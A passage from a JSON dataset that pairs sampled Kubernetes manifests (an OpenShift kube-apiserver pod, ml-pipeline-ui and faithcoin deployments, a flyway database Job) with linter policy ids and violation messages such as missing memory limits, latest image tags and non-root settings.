    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: openshift-kube-apiserver\n  name: kube-apiserver\n  labels:\n    app: openshift-kube-apiserver\n    apiserver: 'true'\n    revision: REVISION\nspec:\n  initContainers:\n  - name: setup\n    image: ${IMAGE}\n    imagePullPolicy: IfNotPresent\n    volumeMounts:\n    - mountPath: /var/log/kube-apiserver\n      name: audit-dir\n    command:\n    - /usr/bin/timeout\n    - '105'\n    - /bin/bash\n    - -ec\n    args:\n    - \"echo -n \\\"Fixing audit permissions.\\\"\\nchmod 0700 /var/log/kube-apiserver\\n\\\n      echo -n \\\"Waiting for port :6443 to be released.\\\"\\nwhile [ -n \\\"$(lsof -ni\\\n      \\ :6443)\\\" ]; do\\n  echo -n \\\".\\\"\\n  sleep 1\\ndone\\n\"\n  containers:\n  - name: kube-apiserver-REVISION\n    image: ${IMAGE}\n    imagePullPolicy: IfNotPresent\n    command:\n    - hypershift\n    - openshift-kube-apiserver\n    args:\n    - --config=/etc/kubernetes/static-pod-resources/configmaps/config/config.yaml\n    resources:\n      requests:\n        memory: 1Gi\n        cpu: 150m\n    ports:\n    - containerPort: 6443\n    volumeMounts:\n    - mountPath: /etc/kubernetes/static-pod-resources\n      name: resource-dir\n    - mountPath: /etc/kubernetes/static-pod-certs\n      name: cert-dir\n    - mountPath: /var/log/kube-apiserver\n      name: audit-dir\n    livenessProbe:\n      httpGet:\n        scheme: HTTPS\n        port: 6443\n        path: healthz\n      initialDelaySeconds: 45\n      timeoutSeconds: 10\n    readinessProbe:\n      httpGet:\n        scheme: HTTPS\n        port: 6443\n        path: healthz\n      initialDelaySeconds: 10\n      timeoutSeconds: 10\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: STATIC_POD_VERSION\n      value: REVISION\n  - name: kube-apiserver-cert-syncer-REVISION\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: POD_NAMESPACE\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    image: ${OPERATOR_IMAGE}\n    imagePullPolicy: IfNotPresent\n    command:\n    - cluster-kube-apiserver-operator\n    - cert-syncer\n    args:\n    - --kubeconfig=/etc/kubernetes/static-pod-resources/configmaps/kube-apiserver-cert-syncer-kubeconfig/kubeconfig\n    - --namespace=$(POD_NAMESPACE)\n    - --destination-dir=/etc/kubernetes/static-pod-certs\n    resources:\n      requests:\n        memory: 50Mi\n        cpu: 10m\n    volumeMounts:\n    - mountPath: /etc/kubernetes/static-pod-resources\n      name: resource-dir\n    - mountPath: /etc/kubernetes/static-pod-certs\n      name: cert-dir\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes/static-pod-resources/kube-apiserver-pod-REVISION\n    name: resource-dir\n  - hostPath:\n      path: /etc/kubernetes/static-pod-resources/kube-apiserver-certs\n    name: cert-dir\n  - hostPath:\n      path: /var/log/kube-apiserver\n    name: audit-dir\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kube-apiserver-cert-syncer-REVISION\" has memory limit 0"
  },
  {
    "id": "11223",
    "manifest_path": "data/manifests/the_stack_sample/sample_4318.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  namespace: openshift-kube-apiserver\n  name: kube-apiserver\n  labels:\n    app: openshift-kube-apiserver\n    apiserver: 'true'\n    revision: REVISION\nspec:\n  initContainers:\n  - name: setup\n    image: ${IMAGE}\n    imagePullPolicy: IfNotPresent\n    volumeMounts:\n    - mountPath: /var/log/kube-apiserver\n      name: audit-dir\n    command:\n    - /usr/bin/timeout\n    - '105'\n    - /bin/bash\n    - -ec\n    args:\n    - \"echo -n \\\"Fixing audit permissions.\\\"\\nchmod 0700 /var/log/kube-apiserver\\n\\\n      echo -n \\\"Waiting for port :6443 to be released.\\\"\\nwhile [ -n \\\"$(lsof -ni\\\n      \\ :6443)\\\" ]; do\\n  echo -n \\\".\\\"\\n  sleep 1\\ndone\\n\"\n  containers:\n  - name: kube-apiserver-REVISION\n    image: ${IMAGE}\n    imagePullPolicy: IfNotPresent\n    command:\n    - hypershift\n    - openshift-kube-apiserver\n    args:\n    - --config=/etc/kubernetes/static-pod-resources/configmaps/config/config.yaml\n    resources:\n      requests:\n        memory: 1Gi\n        cpu: 150m\n    ports:\n    - containerPort: 6443\n    volumeMounts:\n    - mountPath: /etc/kubernetes/static-pod-resources\n      name: resource-dir\n    - mountPath: /etc/kubernetes/static-pod-certs\n      name: cert-dir\n    - mountPath: /var/log/kube-apiserver\n      name: audit-dir\n    livenessProbe:\n      httpGet:\n        scheme: HTTPS\n        port: 6443\n        path: healthz\n      initialDelaySeconds: 45\n      timeoutSeconds: 10\n    readinessProbe:\n      httpGet:\n        scheme: HTTPS\n        port: 6443\n        path: healthz\n      initialDelaySeconds: 10\n      timeoutSeconds: 10\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: STATIC_POD_VERSION\n      value: REVISION\n  - name: kube-apiserver-cert-syncer-REVISION\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: POD_NAMESPACE\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    image: ${OPERATOR_IMAGE}\n    imagePullPolicy: IfNotPresent\n    command:\n    - cluster-kube-apiserver-operator\n    - cert-syncer\n    args:\n    - --kubeconfig=/etc/kubernetes/static-pod-resources/configmaps/kube-apiserver-cert-syncer-kubeconfig/kubeconfig\n    - --namespace=$(POD_NAMESPACE)\n    - --destination-dir=/etc/kubernetes/static-pod-certs\n    resources:\n      requests:\n        memory: 50Mi\n        cpu: 10m\n    volumeMounts:\n    - mountPath: /etc/kubernetes/static-pod-resources\n      name: resource-dir\n    - mountPath: /etc/kubernetes/static-pod-certs\n      name: cert-dir\n  volumes:\n  - hostPath:\n      path: /etc/kubernetes/static-pod-resources/kube-apiserver-pod-REVISION\n    name: resource-dir\n  - hostPath:\n      path: /etc/kubernetes/static-pod-resources/kube-apiserver-certs\n    name: cert-dir\n  - hostPath:\n      path: /var/log/kube-apiserver\n    name: audit-dir\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"setup\" has memory limit 0"
  },
  {
    "id": "11224",
    "manifest_path": "data/manifests/the_stack_sample/sample_4321.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: ml-pipeline-ui\n  name: ml-pipeline-ui\nspec:\n  selector:\n    matchLabels:\n      app: ml-pipeline-ui\n  template:\n    metadata:\n      labels:\n        app: ml-pipeline-ui\n      annotations:\n        cluster-autoscaler.kubernetes.io/safe-to-evict: 'true'\n    spec:\n      volumes:\n      - name: config-volume\n        configMap:\n          name: ml-pipeline-ui-configmap\n      containers:\n      - image: katonic/pipeline-ui:latest\n        imagePullPolicy: IfNotPresent\n        name: ml-pipeline-ui\n        ports:\n        - containerPort: 3005\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/config\n          readOnly: true\n        env:\n        - name: VIEWER_TENSORBOARD_POD_TEMPLATE_SPEC_PATH\n          value: /etc/config/viewer-pod-template.json\n        - name: MINIO_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MINIO_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: mlpipeline-minio-artifact\n              key: accesskey\n        - name: MINIO_SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: mlpipeline-minio-artifact\n              key: secretkey\n        - name: ALLOW_CUSTOM_VISUALIZATIONS\n          value: 'true'\n        readinessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:3005/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n        livenessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:3005/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n        resources:\n          requests:\n            cpu: 10m\n            memory: 70Mi\n      serviceAccountName: ml-pipeline-ui\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"ml-pipeline-ui\" is using an invalid container image, \"katonic/pipeline-ui:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11225",
    "manifest_path": "data/manifests/the_stack_sample/sample_4321.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: ml-pipeline-ui\n  name: ml-pipeline-ui\nspec:\n  selector:\n    matchLabels:\n      app: ml-pipeline-ui\n  template:\n    metadata:\n      labels:\n        app: ml-pipeline-ui\n      annotations:\n        cluster-autoscaler.kubernetes.io/safe-to-evict: 'true'\n    spec:\n      volumes:\n      - name: config-volume\n        configMap:\n          name: ml-pipeline-ui-configmap\n      containers:\n      - image: katonic/pipeline-ui:latest\n        imagePullPolicy: IfNotPresent\n        name: ml-pipeline-ui\n        ports:\n        - containerPort: 3005\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/config\n          readOnly: true\n        env:\n        - name: VIEWER_TENSORBOARD_POD_TEMPLATE_SPEC_PATH\n          value: /etc/config/viewer-pod-template.json\n        - name: MINIO_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MINIO_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: mlpipeline-minio-artifact\n              key: accesskey\n        - name: MINIO_SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: mlpipeline-minio-artifact\n              key: secretkey\n        - name: ALLOW_CUSTOM_VISUALIZATIONS\n          value: 'true'\n        readinessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:3005/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n        livenessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:3005/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n        resources:\n          requests:\n            cpu: 10m\n            memory: 70Mi\n      serviceAccountName: ml-pipeline-ui\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ml-pipeline-ui\" does not have a read-only root file system"
  },
  {
    "id": "11226",
    "manifest_path": "data/manifests/the_stack_sample/sample_4321.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: ml-pipeline-ui\n  name: ml-pipeline-ui\nspec:\n  selector:\n    matchLabels:\n      app: ml-pipeline-ui\n  template:\n    metadata:\n      labels:\n        app: ml-pipeline-ui\n      annotations:\n        cluster-autoscaler.kubernetes.io/safe-to-evict: 'true'\n    spec:\n      volumes:\n      - name: config-volume\n        configMap:\n          name: ml-pipeline-ui-configmap\n      containers:\n      - image: katonic/pipeline-ui:latest\n        imagePullPolicy: IfNotPresent\n        name: ml-pipeline-ui\n        ports:\n        - containerPort: 3005\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/config\n          readOnly: true\n        env:\n        - name: VIEWER_TENSORBOARD_POD_TEMPLATE_SPEC_PATH\n          value: /etc/config/viewer-pod-template.json\n        - name: MINIO_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MINIO_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: mlpipeline-minio-artifact\n              key: accesskey\n        - name: MINIO_SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: mlpipeline-minio-artifact\n              key: secretkey\n        - name: ALLOW_CUSTOM_VISUALIZATIONS\n          value: 'true'\n        readinessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:3005/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n        livenessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:3005/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n        resources:\n          requests:\n            cpu: 10m\n            memory: 70Mi\n      serviceAccountName: ml-pipeline-ui\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"ml-pipeline-ui\" not found"
  },
  {
    "id": "11227",
    "manifest_path": "data/manifests/the_stack_sample/sample_4321.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: ml-pipeline-ui\n  name: ml-pipeline-ui\nspec:\n  selector:\n    matchLabels:\n      app: ml-pipeline-ui\n  template:\n    metadata:\n      labels:\n        app: ml-pipeline-ui\n      annotations:\n        cluster-autoscaler.kubernetes.io/safe-to-evict: 'true'\n    spec:\n      volumes:\n      - name: config-volume\n        configMap:\n          name: ml-pipeline-ui-configmap\n      containers:\n      - image: katonic/pipeline-ui:latest\n        imagePullPolicy: IfNotPresent\n        name: ml-pipeline-ui\n        ports:\n        - containerPort: 3005\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/config\n          readOnly: true\n        env:\n        - name: VIEWER_TENSORBOARD_POD_TEMPLATE_SPEC_PATH\n          value: /etc/config/viewer-pod-template.json\n        - name: MINIO_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MINIO_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: mlpipeline-minio-artifact\n              key: accesskey\n        - name: MINIO_SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: mlpipeline-minio-artifact\n              key: secretkey\n        - name: ALLOW_CUSTOM_VISUALIZATIONS\n          value: 'true'\n        readinessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:3005/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n        livenessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:3005/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n        resources:\n          requests:\n            cpu: 10m\n            memory: 70Mi\n      serviceAccountName: ml-pipeline-ui\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ml-pipeline-ui\" is not set to runAsNonRoot"
  },
  {
    "id": "11228",
    "manifest_path": "data/manifests/the_stack_sample/sample_4321.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: ml-pipeline-ui\n  name: ml-pipeline-ui\nspec:\n  selector:\n    matchLabels:\n      app: ml-pipeline-ui\n  template:\n    metadata:\n      labels:\n        app: ml-pipeline-ui\n      annotations:\n        cluster-autoscaler.kubernetes.io/safe-to-evict: 'true'\n    spec:\n      volumes:\n      - name: config-volume\n        configMap:\n          name: ml-pipeline-ui-configmap\n      containers:\n      - image: katonic/pipeline-ui:latest\n        imagePullPolicy: IfNotPresent\n        name: ml-pipeline-ui\n        ports:\n        - containerPort: 3005\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/config\n          readOnly: true\n        env:\n        - name: VIEWER_TENSORBOARD_POD_TEMPLATE_SPEC_PATH\n          value: /etc/config/viewer-pod-template.json\n        - name: MINIO_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MINIO_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: mlpipeline-minio-artifact\n              key: accesskey\n        - name: MINIO_SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: mlpipeline-minio-artifact\n              key: secretkey\n        - name: ALLOW_CUSTOM_VISUALIZATIONS\n          value: 'true'\n        readinessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:3005/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n        livenessProbe:\n          exec:\n            command:\n            - wget\n            - -q\n            - -S\n            - -O\n            - '-'\n            - http://localhost:3005/apis/v1beta1/healthz\n          initialDelaySeconds: 3\n          periodSeconds: 5\n          timeoutSeconds: 2\n        resources:\n          requests:\n            cpu: 10m\n            memory: 70Mi\n      serviceAccountName: ml-pipeline-ui\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ml-pipeline-ui\" has memory limit 0"
  },
  {
    "id": "11229",
    "manifest_path": "data/manifests/the_stack_sample/sample_4322.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: faithcoin\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: faithcoin\n  template:\n    metadata:\n      labels:\n        app: faithcoin\n        version: v0.15\n    spec:\n      containers:\n      - name: faithcoin\n        image: toolboc/faithcoin\n        ports:\n        - containerPort: 9999\n          name: faithcoin\n          protocol: TCP\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"faithcoin\" is using an invalid container image, \"toolboc/faithcoin\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11230",
    "manifest_path": "data/manifests/the_stack_sample/sample_4322.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: faithcoin\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: faithcoin\n  template:\n    metadata:\n      labels:\n        app: faithcoin\n        version: v0.15\n    spec:\n      containers:\n      - name: faithcoin\n        image: toolboc/faithcoin\n        ports:\n        - containerPort: 9999\n          name: faithcoin\n          protocol: TCP\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "11231",
    "manifest_path": "data/manifests/the_stack_sample/sample_4322.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: faithcoin\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: faithcoin\n  template:\n    metadata:\n      labels:\n        app: faithcoin\n        version: v0.15\n    spec:\n      containers:\n      - name: faithcoin\n        image: toolboc/faithcoin\n        ports:\n        - containerPort: 9999\n          name: faithcoin\n          protocol: TCP\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"faithcoin\" does not have a read-only root file system"
  },
  {
    "id": "11232",
    "manifest_path": "data/manifests/the_stack_sample/sample_4322.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: faithcoin\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: faithcoin\n  template:\n    metadata:\n      labels:\n        app: faithcoin\n        version: v0.15\n    spec:\n      containers:\n      - name: faithcoin\n        image: toolboc/faithcoin\n        ports:\n        - containerPort: 9999\n          name: faithcoin\n          protocol: TCP\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"faithcoin\" is not set to runAsNonRoot"
  },
  {
    "id": "11233",
    "manifest_path": "data/manifests/the_stack_sample/sample_4322.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: faithcoin\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: faithcoin\n  template:\n    metadata:\n      labels:\n        app: faithcoin\n        version: v0.15\n    spec:\n      containers:\n      - name: faithcoin\n        image: toolboc/faithcoin\n        ports:\n        - containerPort: 9999\n          name: faithcoin\n          protocol: TCP\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"faithcoin\" has cpu request 0"
  },
  {
    "id": "11234",
    "manifest_path": "data/manifests/the_stack_sample/sample_4322.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: faithcoin\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: faithcoin\n  template:\n    metadata:\n      labels:\n        app: faithcoin\n        version: v0.15\n    spec:\n      containers:\n      - name: faithcoin\n        image: toolboc/faithcoin\n        ports:\n        - containerPort: 9999\n          name: faithcoin\n          protocol: TCP\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"faithcoin\" has memory limit 0"
  },
  {
    "id": "11235",
    "manifest_path": "data/manifests/the_stack_sample/sample_4326.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: prometheus-k8s\n  annotations:\n    service.alpha.openshift.io/serving-cert-secret-name: prometheus-proxy-cert\n  labels:\n    app: enmasse\n    prometheus: k8s\nspec:\n  ports:\n  - name: web\n    port: 9090\n    targetPort: web\n  - name: proxy\n    port: 443\n    targetPort: 8443\n  selector:\n    prometheus: k8s\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[prometheus:k8s])"
  },
  {
    "id": "11236",
    "manifest_path": "data/manifests/the_stack_sample/sample_4331.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: base-app\nspec:\n  type: LoadBalancer\n  selector:\n    app: base-app\n  ports:\n  - port: 80\n    targetPort: 8080\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:base-app])"
  },
  {
    "id": "11237",
    "manifest_path": "data/manifests/the_stack_sample/sample_4335.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: ks-devops-db-ctrl-job\n  namespace: kubesphere-devops-system\n  labels:\n    app: ks-devops-apiserver\n    job: ks-devops-db-ctrl\n    version: latest\nspec:\n  template:\n    metadata:\n      labels:\n        app: ks-devops-apiserver\n        job: ks-devops-db-ctrl\n        version: latest\n      name: ks-devops-db-ctrl\n    spec:\n      initContainers:\n      - name: wait-mysql\n        image: busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - until nc -z openpitrix-db.openpitrix-system.svc 3306; do echo \"waiting for\n          mysql\"; sleep 2; done;\n      containers:\n      - command:\n        - flyway\n        - -X\n        - -url=jdbc:mysql://openpitrix-db.openpitrix-system.svc/devops\n        - -user=root\n        - -validateOnMigrate=false\n        - -locations=filesystem:/flyway/sql/devops\n        - migrate\n        env:\n        - name: FLYWAY_PASSWORD\n          value: password\n        image: kubesphere/devops:flyway\n        imagePullPolicy: Always\n        name: devops-db-ctrl\n        resources: {}\n      securityContext: {}\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "11238",
    "manifest_path": "data/manifests/the_stack_sample/sample_4335.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: ks-devops-db-ctrl-job\n  namespace: kubesphere-devops-system\n  labels:\n    app: ks-devops-apiserver\n    job: ks-devops-db-ctrl\n    version: latest\nspec:\n  template:\n    metadata:\n      labels:\n        app: ks-devops-apiserver\n        job: ks-devops-db-ctrl\n        version: latest\n      name: ks-devops-db-ctrl\n    spec:\n      initContainers:\n      - name: wait-mysql\n        image: busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - until nc -z openpitrix-db.openpitrix-system.svc 3306; do echo \"waiting for\n          mysql\"; sleep 2; done;\n      containers:\n      - command:\n        - flyway\n        - -X\n        - -url=jdbc:mysql://openpitrix-db.openpitrix-system.svc/devops\n        - -user=root\n        - -validateOnMigrate=false\n        - -locations=filesystem:/flyway/sql/devops\n        - migrate\n        env:\n        - name: FLYWAY_PASSWORD\n          value: password\n        image: kubesphere/devops:flyway\n        imagePullPolicy: Always\n        name: devops-db-ctrl\n        resources: {}\n      securityContext: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"devops-db-ctrl\" does not have a read-only root file system"
  },
  {
    "id": "11239",
    "manifest_path": "data/manifests/the_stack_sample/sample_4335.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: ks-devops-db-ctrl-job\n  namespace: kubesphere-devops-system\n  labels:\n    app: ks-devops-apiserver\n    job: ks-devops-db-ctrl\n    version: latest\nspec:\n  template:\n    metadata:\n      labels:\n        app: ks-devops-apiserver\n        job: ks-devops-db-ctrl\n        version: latest\n      name: ks-devops-db-ctrl\n    spec:\n      initContainers:\n      - name: wait-mysql\n        image: busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - until nc -z openpitrix-db.openpitrix-system.svc 3306; do echo \"waiting for\n          mysql\"; sleep 2; done;\n      containers:\n      - command:\n        - flyway\n        - -X\n        - -url=jdbc:mysql://openpitrix-db.openpitrix-system.svc/devops\n        - -user=root\n        - -validateOnMigrate=false\n        - -locations=filesystem:/flyway/sql/devops\n        - migrate\n        env:\n        - name: FLYWAY_PASSWORD\n          value: password\n        image: kubesphere/devops:flyway\n        imagePullPolicy: Always\n        name: devops-db-ctrl\n        resources: {}\n      securityContext: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"wait-mysql\" does not have a read-only root file system"
  },
  {
    "id": "11240",
    "manifest_path": "data/manifests/the_stack_sample/sample_4335.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: ks-devops-db-ctrl-job\n  namespace: kubesphere-devops-system\n  labels:\n    app: ks-devops-apiserver\n    job: ks-devops-db-ctrl\n    version: latest\nspec:\n  template:\n    metadata:\n      labels:\n        app: ks-devops-apiserver\n        job: ks-devops-db-ctrl\n        version: latest\n      name: ks-devops-db-ctrl\n    spec:\n      initContainers:\n      - name: wait-mysql\n        image: busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - until nc -z openpitrix-db.openpitrix-system.svc 3306; do echo \"waiting for\n          mysql\"; sleep 2; done;\n      containers:\n      - command:\n        - flyway\n        - -X\n        - -url=jdbc:mysql://openpitrix-db.openpitrix-system.svc/devops\n        - -user=root\n        - -validateOnMigrate=false\n        - -locations=filesystem:/flyway/sql/devops\n        - migrate\n        env:\n        - name: FLYWAY_PASSWORD\n          value: password\n        image: kubesphere/devops:flyway\n        imagePullPolicy: Always\n        name: devops-db-ctrl\n        resources: {}\n      securityContext: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"devops-db-ctrl\" is not set to runAsNonRoot"
  },
  {
    "id": "11241",
    "manifest_path": "data/manifests/the_stack_sample/sample_4335.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: ks-devops-db-ctrl-job\n  namespace: kubesphere-devops-system\n  labels:\n    app: ks-devops-apiserver\n    job: ks-devops-db-ctrl\n    version: latest\nspec:\n  template:\n    metadata:\n      labels:\n        app: ks-devops-apiserver\n        job: ks-devops-db-ctrl\n        version: latest\n      name: ks-devops-db-ctrl\n    spec:\n      initContainers:\n      - name: wait-mysql\n        image: busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - until nc -z openpitrix-db.openpitrix-system.svc 3306; do echo \"waiting for\n          mysql\"; sleep 2; done;\n      containers:\n      - command:\n        - flyway\n        - -X\n        - -url=jdbc:mysql://openpitrix-db.openpitrix-system.svc/devops\n        - -user=root\n        - -validateOnMigrate=false\n        - -locations=filesystem:/flyway/sql/devops\n        - migrate\n        env:\n        - name: FLYWAY_PASSWORD\n          value: password\n        image: kubesphere/devops:flyway\n        imagePullPolicy: Always\n        name: devops-db-ctrl\n        resources: {}\n      securityContext: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"wait-mysql\" is not set to runAsNonRoot"
  },
  {
    "id": "11242",
    "manifest_path": "data/manifests/the_stack_sample/sample_4335.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: ks-devops-db-ctrl-job\n  namespace: kubesphere-devops-system\n  labels:\n    app: ks-devops-apiserver\n    job: ks-devops-db-ctrl\n    version: latest\nspec:\n  template:\n    metadata:\n      labels:\n        app: ks-devops-apiserver\n        job: ks-devops-db-ctrl\n        version: latest\n      name: ks-devops-db-ctrl\n    spec:\n      initContainers:\n      - name: wait-mysql\n        image: busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - until nc -z openpitrix-db.openpitrix-system.svc 3306; do echo \"waiting for\n          mysql\"; sleep 2; done;\n      containers:\n      - command:\n        - flyway\n        - -X\n        - -url=jdbc:mysql://openpitrix-db.openpitrix-system.svc/devops\n        - -user=root\n        - -validateOnMigrate=false\n        - -locations=filesystem:/flyway/sql/devops\n        - migrate\n        env:\n        - name: FLYWAY_PASSWORD\n          value: password\n        image: kubesphere/devops:flyway\n        imagePullPolicy: Always\n        name: devops-db-ctrl\n        resources: {}\n      securityContext: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"devops-db-ctrl\" has cpu request 0"
  },
  {
    "id": "11243",
    "manifest_path": "data/manifests/the_stack_sample/sample_4335.yaml",
